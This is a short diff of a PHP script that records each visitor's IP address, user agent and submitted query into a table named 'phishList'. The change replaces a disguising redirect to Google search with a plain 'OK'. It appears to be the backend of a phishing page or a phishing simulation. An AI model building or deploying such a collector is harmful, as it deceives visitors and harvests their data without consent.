@@ -12,15 +12,14 @@ if (!$conn) {
     exit("DB connection failed");
 }
 
-$IP = $_SERVER["REMOTE_ADDR"] ?? '';
-$agent = $_SERVER["HTTP_USER_AGENT"] ?? '';
 $query = $_POST['query'] ?? '';
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
 $stmt = $conn->prepare(
     "INSERT INTO phishList (IP, agent, `query`) VALUES (?, ?, ?)"
 );
-$stmt->bind_param("sss", $IP, $agent, $query);
+$stmt->bind_param("sss", $ip, $agent, $query);
 $stmt->execute();
 
-header("Location: https://www.google.com/search?q=" . urlencode($query));
-exit;
+echo "OK";
